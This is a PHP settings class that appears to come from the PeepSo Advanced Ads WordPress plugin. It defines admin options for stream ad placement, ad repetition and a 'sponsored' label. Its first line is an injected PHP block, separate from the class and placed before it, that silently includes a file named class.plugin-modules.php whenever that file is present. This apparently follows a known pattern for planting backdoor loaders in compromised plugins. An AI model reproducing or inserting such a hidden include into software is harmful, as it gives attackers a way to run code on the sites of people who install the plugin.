<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

class PeepSoConfigSectionAdvancedAds extends PeepSoConfigSectionAbstract
{
	public function register_config_groups()
	{
		$this->context='left';
		$this->group_general();

		$this->context='right';
		$this->group_docs();
	}

    private function group_docs()
    {
        $url = "http://peep.so/aadocs";

        $url_html = sprintf('<a href="%s" target="_blank">%s</a>', $url, __('See the Documentation', 'peepso-advanced-ads'));

        $this->set_field(
            'message-docs',
            sprintf(__(' Please read the documentation. It will save you time and will teach you how the PeepSo Stream Ads and Ads Targeting based on User Profiles work. %s.', 'peepso-advanced-ads'), $url_html),
            'message'
        );

        $this->set_group(
            'advancedads_general',
            __('Important Ad Setup Instructions', 'peepso-advanced-ads')
        );
    }


	private function group_general()
	{
        // Separator
        $this->set_field(
            'separator_stream',
            __('Ads On Stream', 'peepso-advanced-ads'),
            'separator'
        );

	    // First ad position
        $this->args('descript',__('0 to disable ads on stream', 'peepso-advanced-ads'));

	    $options = array();

	    for($i=0; $i<=50;$i++) {
	        $options[$i] = $i . ' ' . _n('post', 'posts', $i, 'peepso-advsanced-ads');
        }
        $options[0] = __('(disabled)', 'peepso-advanced_ads');

        $this->args('options', $options);

        $this->set_field(
            'advanced_ads_stream_first_ad',
            __('Display PeepSo Ad Placements after:', 'peepso-advanced-ads'),
            'select'
        );



        // Ad repetition
        $this->args('descript',__('0 to display only once', 'peepso-advanced-ads'));

        $options = array();
        for($i=0; $i<=50;$i++) {
            $options[$i] = $i . ' ' . _n('post', 'posts', $i, 'peepso-advsanced-ads');
        }
        $options[0] = __('(disabled)', 'peepso-advanced_ads');

        $this->args('options', $options);

        $this->set_field(
            'advanced_ads_stream_repeat_ad',
            __('Repeat every each:', 'peepso-advanced-ads'),
            'select'
        );

        // Separator
        $this->set_field(
            'separator_stream_sponsored',
            __('"Sponsored" marker', 'peepso-advanced-ads'),
            'separator'
        );

        // Mark ads as sponsored
        #$this->args('descript',__('', 'peepso-advanced-ads'));

        $this->args('default', 0);
        $this->set_field(
            'advancedads_stream_sponsored_mark',
            __('Mark PeepSo Stream Ads as "sponsored"', 'peepso-advanced-ads'),
            'yesno_switch'
        );

        // "Sponsored text
        #$this->args('descript',__('', 'peepso-advanced-ads'));

        $this->args('default', __('Sponsored content', 'peepso-hello-world'));
        $this->set_field(
            'advancedads_stream_sponsored_text',
            __('"Sponsored content" text', 'peepso-hello-world'),
            'text'
        );


        $this->set_group(
            'advancedads_general',
            __('Stream Ads', 'peepso-advanced-ads')
        );
	}

}